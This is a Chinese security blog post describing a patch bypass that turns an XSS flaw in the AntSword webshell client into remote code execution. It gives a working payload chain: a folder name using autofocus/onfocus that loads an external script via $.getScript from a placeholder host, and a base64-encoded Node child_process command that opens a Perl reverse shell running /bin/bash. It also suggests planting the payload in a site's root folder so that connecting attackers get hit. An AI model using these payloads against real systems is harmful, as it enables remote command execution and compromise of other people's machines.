# 蚁剑RCE第二回合来袭~黑阔们小心了

阅读量 **378755**

|评论 **11**

发布时间 : 2019-04-17 12:00:56

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t013604fe80c00e8671.png)

## 0x00 前言

hello我是掌控安全学院的聂风，12号中国蚁剑爆出客户端RCE,不过官方第一时间修复了。于是实验室的老师们看了一下，于是绕过了防护，于是有了新的RCE漏洞。~_~

Tips：我们会开课讲解部分文章漏洞原理、并进行复现

现在>>>>>[
**点击这里**](https://ke.qq.com/course/275794?flowToken=1009064)<<<<<<即可关注，名额有限噢~

## 0x01 环境搭建

[中国蚁剑](https://github.com/AntSwordProject/antSword/)

windows直接下载运行

如果是Linux或者是MAC

可以使用[AntSword加载器](https://github.com/AntSwordProject/AntSword-Loader)

## 0x02 漏洞分析

首先对蚁剑进行复测，发现分类目录处的XSS并没有被修复，可能因为过于鸡肋项目方忽略了。（不过需要右键点击空白处）

![](https://github.com/zkaq/tuchuang/raw/master/1.png)

接着我们复测了之前的RCE,发现该漏洞已被过滤修复，我们来简单分析一下是怎么修复的。

![](https://github.com/zkaq/tuchuang/raw/master/2.png)

新加上用来过滤的noxss函数 在source/app.entry.js文件中

![](https://github.com/zkaq/tuchuang/raw/master/3.png)

这里很明显使用了JS的替换，而我们能看到替换的内容，其实也就是类似于进行了html实体编码  
接着问题来了，它过滤了尖括号和双引号，但是没有过滤单引号？  
So 我们可以通过单引号来闭合双引号。首先我们需要找到一个标签之内可以XSS的地方

![](https://github.com/zkaq/tuchuang/raw/master/4.png)

我们发现它调用了dhtmlx框架

![](https://github.com/zkaq/tuchuang/raw/master/5.png)

接着我们来看这个UI框架

通过分析，该框架的dhtmlxtoolbar.js文件有点儿小毛病  
文件地址：
<https://github.com/liuhuisheng/dhtmlx_web/blob/8a637bac7e92c76764e95cdd61f2e0fe60220822/assets/lib/dhtmlx/v403_pro/sources/dhtmlxToolbar/codebase/dhtmlxtoolbar.js>

该文件第1775行

    
    
    this.obj.innerHTML = "<input class='dhxtoolbar_input' type='text' style='width:"+this.obj.w+"px;'"+(data.value!=null?" value='"+data.value+"'":"")+">";
    

这段代码会将获取到的参数直接拼接到input标签里面，而UI框架没有任何过滤

于是乎我们找到了文件路径处，这里存在一个我们可以控制的标签（可Xss）

![](https://github.com/zkaq/tuchuang/raw/master/6.png)

## 0x03 攻击手法

这里原本是一个input标签，我们可以构建oninput事件来触发该XSS

Payload: ‘oninput=alert(1) ;’

![](https://github.com/zkaq/tuchuang/raw/master/7.png)

输入语句，很明显该XSS生效了，接着输入字符，成功弹窗

![](https://github.com/zkaq/tuchuang/raw/master/8.png)

那么有个小问题，这个oninput标签是需要交互式触发的，看起来很鸡肋，但是经过一个微妙组合，就可以自动触发了

科普：

autofocus：是能够让input自动获取焦点的属性。

onfocus： 当input自动获取焦点时会触发事件。  
那么我们在input标签中包含一个autofocus的属性（让它自动获取焦点）。  
然后自动触发onfocus事件内的Js脚本。

触发点在路径上，如果我将一个文件夹命名为我们的payload，当蚁剑连接时就可以成功触发漏洞。

![](https://github.com/zkaq/tuchuang/raw/master/9.png)

我们还可以将网站的根目录设置为这个文件夹，当攻击者想要连接我们站上的shell时，我们就能反杀回去-.-
![](https://github.com/zkaq/tuchuang/raw/master/10.png)

![](https://github.com/zkaq/tuchuang/raw/master/11.png)

XSS部分概述完毕，但我们最终是要进行RCE命令执行。

我们将构建语句完成一次SSJI(服务器端JavaScript注入)

###  利用障碍

Linux文件名的长度限制是255个字符 windows下完全限定文件名必须少于260个字符,目录名必须小于248个字符，且不能参杂特定字符给文件夹命名。

###  绕过障碍

正常payload基本大于长度限制。我们需要缩短payload长度

我们可以使用外部引用，因为蚁剑使用了jquery,故可以使用$.getScript来引用外部js脚本，虽然文件夹名中不可含有//，但我们可以使用unescape代码对payload进行加密

###  最终

Payload:

    
    
    'autofocus onfocus=$.getScript(unescape('http%3A%2f%2fxxx.in%2f2Yuo%0A'));'
    

![](https://github.com/zkaq/tuchuang/raw/master/12.png)

Xss平台那边的payload代码,我们就直接拿之前爆出的RCE利用代码

payload:

    
    
    eval(new Buffer(`cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ3BlcmwgLWUgXCd1c2UgU29ja2V0OyRpPSIxMjcuMC4wLjEiOyRwPTEwMDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9iYXNoIC1pIik7fTtcJycsKGVycm9yLCBzdGRvdXQsIHN0ZGVycik9PnsKICAgIGFsZXJ0KGBzdGRvdXQ6ICR7c3Rkb3V0fWApOwogIH0pOw==`,`base64`).toString())
    

Base64解码出来就是

    
    
    require('child_process').exec('perl -e 'use 
    Socket;$i="127.0.0.1";$p=1002;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'',(error, stdout, stderr)=>{
        alert(`stdout: ${stdout}`);
      });
    

由此我们得到了一个反弹到本地的CMDshell.

## 结言

本篇文章提到的SSJI，我们有一个审计专题SSJI ——
Node.js漏洞审计系列做简单介绍，欢迎关注我们的Track社区[www.zkaq.org](www.zkaq.org)了解。

###  最后的福利

掌控安全学院 x 腾讯课堂开设Web安全公开课（免费），累计报名学员超过15000名，添加助教微信，回复“7”即可领取往期直播课视频及直播课通知。

![](https://ws3.sinaimg.cn/large/006Xmmmgly1g24y5cu809j30by0bymxr.jpg)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **掌控安全学院** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/176724](/post/id/176724)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Web安全](/tag/Web安全)
  * [RCE](/tag/RCE)

 **+1** __23赞

 __收藏

![](https://p2.ssl.qhimg.com/t014f774daeca5ec49b.png) 掌控安全学院

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

